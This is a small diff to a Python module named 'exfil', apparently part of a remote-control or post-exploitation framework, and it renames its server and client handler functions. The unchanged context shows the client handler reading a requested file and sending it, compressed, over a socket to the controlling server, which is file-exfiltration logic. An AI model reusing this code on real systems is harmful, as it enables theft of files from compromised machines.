@@ -13,7 +13,7 @@ usage: exfil [-h] file1 [file2 file3 ...]
 
 
 @module.server_handler(MODNAME)
-def server_exec(server, argv):
+def server(server, argv):
     if len(argv) < 2 or argv[1] in ('-h', '--help'):
         print USAGE
         return
@@ -28,6 +28,6 @@ def server_exec(server, argv):
 
 
 @module.client_handler(MODNAME)
-def client_shell(client, inp):
+def client(client, inp):
     with open(os.path.expanduser(inp[6:])) as f:
         client.s.send(zlib.compress(f.read()))
